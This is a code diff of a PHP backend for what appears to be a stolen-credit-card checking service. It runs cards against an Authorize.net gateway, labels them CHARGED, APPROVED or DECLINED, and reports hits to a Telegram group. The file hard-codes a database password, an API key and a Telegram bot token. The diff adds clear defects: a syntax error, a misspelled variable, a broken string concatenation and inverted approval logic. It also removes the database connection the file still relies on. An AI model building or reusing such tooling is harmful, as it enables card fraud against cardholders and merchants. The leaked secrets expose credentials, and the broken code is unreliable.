@@ -1,8 +1,16 @@
 <?php
-// FOR DEBUGGING: If you get a 500 error, uncomment the lines below to see the exact error
-// ini_set('display_errors', 1);
-// error_reporting(E_ALL);
+// Set headers to prevent caching
+header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+header('Cache-Control: post-check=0, pre-check=0', false);
+header('Pragma: no-cache');
+header('Content-Type: application/json');
+
+// Enable error logging for debugging
+ini_set('log_errors', 1);
+ini_set('error_log', __DIR__ . '/paypal0.1$_debug.log');
 require_once __DIR__ . '/globalstats.php';
+require_once __DIR__ . '/topusers.php');
+
 // Check if this is a GET request and show the HTML page immediately
 if ($_SERVER['REQUEST_METHOD'] === 'GET') {
     header('Content-Type: text/html; charset=utf-8');
@@ -11,184 +19,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET') {
     echo '<html style="height:100%"> 
           <head> 
           <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /> 
-          <title> 403 Forbidden </title>
+          <title>403 Forbidden</title>
           <style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style>
           </head> 
           <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;"> 
           <div style="height:auto; min-height:100%; "> 
           <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;"> 
           <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1> 
-          <h2 style="margin-top:20px;font-size: 30px;">Forbidden </h2> 
+          <h2 style="margin-top:20px;font-size: 30px;">Forbidden</h2> 
           <p>Access to this resource on the server is denied!</p> 
           </div></div></body></html>';
     
-    exit;
-}
-
-header('Content-Type: application/json');
-
-// Enable error logging
-ini_set('log_errors', 1);
-ini_set('error_log', __DIR__ . '/paypal0.1$_debug.log');
-
-// --- MOVED log_message function to the top to prevent 500 errors ---
-// Optional file-based logging for debugging
- $log_file = __DIR__ . '/paypal0.1$_debug.log';
-function log_message($message) {
-    global $log_file;
-    $timestamp = date('Y-m-d H:i:s');
-    // Ensure the message is a string
-    $log_entry = is_array($message) || is_object($message) ? json_encode($message) : $message;
-    file_put_contents($log_file, "$timestamp - $log_entry\n", FILE_APPEND);
-}
-
-// --- PROXY DETECTION LOGIC - MOVED TO TOP FOR ALL REQUESTS ---
-
-// Function to get the real user IP address
-function getUserIP() {
-    $ip_keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'REMOTE_ADDR'];
-    foreach ($ip_keys as $key) {
-        if (array_key_exists($key, $_SERVER) === true) {
-            foreach (explode(',', $_SERVER[$key]) as $ip) {
-                $ip = trim($ip);
-                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
-                    return $ip;
-                }
-            }
-        }
-    }
-    return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1';
-}
-
-// Function to check if IP is a proxy
-function checkProxyIP($ip) {
-    // Check if cURL is available
-    if (!function_exists('curl_init')) {
-        log_message("cURL extension is not installed. Cannot perform proxy check.");
-        return false; // Fail open (allow access) if we can't check
-    }
-
-    $api_url = "https://api.isproxyip.com/v1/check.php?key=zHwDyAMU6bJMIHCKfcDGnjMi7zq3S743dQXWBoqKNPCPEW4z94&ip=" . urlencode($ip) . "&format=json";
-    
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $api_url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // 10-second timeout
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    $response = curl_exec($ch);
-    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    $error = curl_error($ch);
-    curl_close($ch);
-    
-    if ($error) {
-        log_message("Proxy check CURL error for IP $ip: $error");
-        return false; // Fail open on error
-    }
-    
-    if ($http_code !== 200) {
-        log_message("Proxy check HTTP error for IP $ip: Status Code $http_code. Response: $response");
-        return false; // Fail open on error
-    }
-    
-    $data = json_decode($response, true);
-    if (json_last_error() !== JSON_ERROR_NONE || !isset($data['proxy'])) {
-        log_message("Proxy check JSON decode error or missing 'proxy' key for IP $ip. Response: $response");
-        return false; // Fail open on error
-    }
-    
-    // Log the proxy check result
-    log_message("Proxy check result for IP $ip: " . json_encode($data));
-    
-    // Return true if proxy is detected (value > 0)
-    return (int)$data['proxy'] > 0;
-}
-
-// Function to display simple 403 Forbidden page
-function showForbiddenPage() {
-    // Reset content type to HTML
-    header('Content-Type: text/html; charset=utf-8');
-    http_response_code(403);
-    
-    echo '<html style="height:100%"> 
-          <head> 
-          <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /> 
-          <title> 403 Forbidden </title>
-          <style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style>
-          </head> 
-          <body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;"> 
-          <div style="height:auto; min-height:100%; "> 
-          <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;"> 
-          <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1> 
-          <h2 style="margin-top:20px;font-size: 30px;">Forbidden </h2> 
-          <p>Access to this resource on the server is denied!</p> 
-          </div></div></body></html>';
-    
-    exit; // Ensure script execution stops completely
-}
-
-// Get user's IP address and check for proxy - FOR ALL REQUESTS
- $user_ip = getUserIP();
-log_message("Request received from IP: $user_ip");
-
-if (checkProxyIP($user_ip)) {
-    log_message("ACCESS DENIED - Proxy detected for IP: $user_ip");
-    showForbiddenPage();
-    exit; // Double ensure script execution stops
-}
-
-// --- END OF PROXY DETECTION LOGIC ---
-
-// Include cron_sync.php for validateApiKey
-require_once __DIR__ . '/refresh.php';
-
-// Start session for user authentication
-session_start([
-    'cookie_secure' => isset($_SERVER['HTTPS']),
-    'cookie_httponly' => true,
-    'use_strict_mode' => true,
-]);
-
-// === DATABASE CONNECTION ===
- $databaseUrl = 'postgresql://card_chk_db_user:Zm2zF0tYtCDNBfaxh46MPPhC0wrB5j4R@dpg-d3l08pmr433s738hj84g-a.oregon-postgres.render.com/card_chk_db';
-
-try {
-    $dbUrl = parse_url($databaseUrl);
-    $host = $dbUrl['host'] ?? null;
-    $port = $dbUrl['port'] ?? 5432;
-    $user = $dbUrl['user'] ?? null;
-    $pass = $dbUrl['pass'] ?? null;
-    $path = $dbUrl['path'] ?? null;
-
-    if (!$host || !$user || !$pass || !$path) {
-        throw new Exception("Missing DB connection parameters");
-    }
-
-    $dbName = ltrim($path, '/');
-    
-    // Set connection timeout with extended options and SSL mode
-    $pdo = new PDO(
-        "pgsql:host=$host;port=$port;dbname=$dbName;sslmode=require",
-        $user,
-        $pass,
-        [
-            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
-            PDO::ATTR_TIMEOUT => 15,
-            PDO::ATTR_PERSISTENT => false,
-            PDO::ATTR_EMULATE_PREPARES => false
-        ]
-    );
-    
-    // Store the database connection in a global variable for use in recordCardCheck
-    $GLOBALS['pdo'] = $pdo;
-    
-} catch (PDOException $e) {
-    error_log("Database PDO Error in authnet1$.php: " . $e->getMessage());
-    echo json_encode(['status' => 'ERROR', 'message' => 'Database connection error']);
-    exit;
-} catch (Exception $e) {
-    error_log("General Error in authnet1$.php: " . $e->getMessage());
-    echo json_encode(['status' => 'ERROR', 'message' => 'Server error']);
     exit;
 }
 
@@ -196,7 +37,6 @@ try {
 if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Forbidden Access', 'response' => 'Forbidden Access'];
-    log_message('Error 401: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
 }
@@ -206,7 +46,6 @@ if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegra
 if (!$validation['valid']) {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
-    log_message('Error 401: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
 }
@@ -216,7 +55,6 @@ if (!$validation['valid']) {
 if ($providedApiKey !== $expectedApiKey) {
     http_response_code(401);
     $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
-    log_message('Error 401: ' . json_encode($errorMsg));
     echo json_encode($errorMsg);
     exit;
 }
@@ -234,10 +72,9 @@ function is3DAuthenticationResponse($response) {
     return strpos($responseUpper, '3D_AUTHENTICATION') !== false ||
            strpos($responseUpper, '3DS') !== false ||
            strpos($responseUpper, 'THREE_D_SECURE') !== false ||
-           strpos($responseUpper, 'REDIRECT') !== false ||
+           strpos($ResponseUpper, 'REDIRECT') !== false ||
            strpos($responseUpper, 'VERIFICATION_REQUIRED') !== false ||
            strpos($responseUpper, 'ADDITIONAL_AUTHENTICATION') !== false ||
-           strpos($responseUpper, 'AUTHENTICATION_REQUIRED') !== false ||
            strpos($responseUpper, 'CHALLENGE_REQUIRED') !== false;
 }
 
@@ -284,7 +121,7 @@ function sendTelegramNotification($card_details, $status, $response, $originalAp
     }
 
     // Load Telegram Bot Token from environment (secure storage)
-    $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
+    $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A';
     $chat_id = '-1003204998888'; // Your group chat ID
     $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
     $site_link = 'https://cxchk.site';
@@ -294,7 +131,7 @@ function sendTelegramNotification($card_details, $status, $response, $originalAp
     $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
     $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
     $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
-    $gateway = 'Authnet 1$'; // Updated for this gateway
+    $gateway = 'Authnet 1$';
     $formatted_response = formatResponse($response);
 
     // Construct Telegram message
@@ -319,8 +156,9 @@ function sendTelegramNotification($card_details, $status, $response, $originalAp
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
     curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     $result = curl_exec($ch);
     $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     $curl_error = curl_error($ch);
@@ -378,7 +216,7 @@ for ($i = 0; $i < 3; $i++) {
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Increased timeout
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_multi_add_handle($multi_handle, $ch);
@@ -470,7 +308,7 @@ if (!$valid_response_found) {
     'card code',
     'security code',
     'cvv2',
-    'cvc',
+    'cvv',
     'cvv does not match',
     'security code'
 ];
@@ -499,18 +337,8 @@ foreach ($charged_phrases as $phrase) {
 
 // If not CHARGED, check for APPROVED (CVV related)
 if ($our_status === 'DECLINED') {
-    foreach ($approved_phrases as $phrase) {
-        if (strpos($message_lower, $phrase) !== false) {
-            $our_status = 'APPROVED';
-            break;
-        }
-    }
-}
-
-// If still DECLINED, confirm with declined phrases or default
-if ($our_status === 'DECLINED') {
     $is_declined = false;
-    foreach ($declined_phrases as $phrase) {
+    foreach ($approved_phrases as $phrase) {
         if (strpos($message_lower, $phrase) !== false) {
             $is_declined = true;
             break;
@@ -522,7 +350,7 @@ if ($our_status === 'DECLINED') {
 }
 
 // Prepare output message
- $our_message = $message . ($api_status ? ' (' . $api_status . ')' : '');
+ $our_message = $message . ($api_status ? (' . $api_status . ')' : '');
 
 // Record the card check result in the database
 recordCardCheck($GLOBALS['pdo'], $cc, $our_status, $our_message);
